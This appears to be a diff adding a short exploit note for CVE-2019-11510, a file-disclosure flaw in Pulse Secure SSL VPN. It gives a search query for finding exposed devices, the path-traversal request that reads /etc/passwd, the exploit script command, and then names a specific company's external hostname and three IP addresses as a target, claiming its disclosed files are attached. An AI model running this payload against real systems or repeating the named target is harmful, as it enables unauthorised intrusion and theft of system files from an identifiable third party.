@@ -1,0 +1,25 @@
+Pulse Secure SSL VPN 8.1R15.1 / 8.2 / 8.3 / 9.0 Arbitrary File Disclosure
+
+1.Junuper VPN Vul 
+  - Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests.
+  - This exploit reads /etc/passwd as a proof of concept
+  - This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 ) 
+
+2. Shodan Dork : /dana-na/auth/url_default/welcome.cgi 15,432 from Zoomeye(https://www.zoomeye.org/searchResult?q=%2Fdana-na%2Fauth%2Furl_default%2Fwelcome.cgi)[2.png]
+
+3. Exploit Checking parameter : /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
+
+4. external.samsungbiologics.com [1.png , samsungbiologics.com.png , redteam3.png]
+112.106.137.215
+112.106.137.216
+112.106.137.217
+
+5. Exploit
+bash CVE-2019-11510.sh -d https://external.samsungbiologics.com/ --only-etc-passwd
+
+6. S-Company File disclosure : Attached File [external.samsungbiologics.com.zip] *Only offer you a range that is open to you.
+
+7. Reference
+https://nvd.nist.gov/vuln/detail/CVE-2019-11510
+Proof Of Concept-1 : https://packetstormsecurity.com/files/154176/Pulse-Secure-SSL-VPN-8.1R15.1-8.2-8.3-9.0-Arbitrary-File-Disclosure.html
+Proof Of Concept-2 : Attached File [CVE-2019-11510-master.zip]
